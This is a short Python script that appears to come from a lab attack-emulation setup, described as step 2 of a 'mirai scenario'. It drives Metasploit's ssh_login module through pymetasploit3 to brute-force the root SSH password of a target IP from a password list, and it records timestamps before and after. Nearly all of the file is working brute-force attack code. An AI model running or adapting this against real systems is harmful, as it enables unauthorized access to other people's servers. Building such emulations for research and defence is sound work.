# This step is the step tried to reach public facing application through password guessing/cracking
# The password guessing in performed on the vulneratble and non vulnerable client for 01_mirai scenarion and target server for other scenario

import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    time_output_file = os.path.join(folder, output_time_file)
    with open(time_output_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    # if len(argv) != 4:
    #     print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    target_ip = argv[3]

    # folder = "/home/kali/Desktop/reinstall"
    # target_ip = "192.168.56.181"

    client = MsfRpcClient('kali')

    output_time_file_start = 'time_step_2_mirai_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    # put the attack launch command
    auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
    auxiliary['PASS_FILE'] = "/home/kali/Desktop/reinstall/unix_passwords_modified.txt"
    auxiliary['USERNAME'] = "root"
    auxiliary['RHOSTS'] = target_ip
    auxiliary['RPORT'] = 22
    auxiliary['VERBOSE'] = True

    auxiliary.execute()
    print(client.jobs.list)
    while client.jobs.list:
        time.sleep(1)

    time.sleep(10)
    output_time_file_end = 'time_step_2_mirai_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(2)

    print("finish")


main(sys.argv)
